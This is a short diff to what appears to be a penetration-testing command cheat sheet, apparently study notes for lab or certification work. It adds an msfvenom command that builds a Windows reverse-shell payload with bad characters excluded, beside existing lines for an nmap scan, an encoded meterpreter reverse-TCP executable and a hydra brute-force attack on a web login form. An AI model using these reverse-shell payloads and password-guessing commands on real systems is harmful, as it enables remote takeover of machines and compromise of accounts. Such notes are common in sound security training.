@@ -31,6 +31,11 @@ nmap -sC -sV -oN <OUTPUT_FILE> -vv <IP_ADDRESS>
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP_ADDRESS> LPORT=<LISTENING_PORT> -f exe -e x86/shikata_ga_nai -o <OUTPUT_FILE>
 ```
 
+### msfvenom (Simple Windows Payload Shell)
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f py -b [bad characters]
+```
+
 ### hydra (http-post-form)
 ```
 hydra -l <USERNAME> -P <PASSWORD_LIST> http-post-form <IP_ADDRESS> "<DIRECTORY> : <RAW_POST_REQUEST> <ERROR_MESSAGE>"
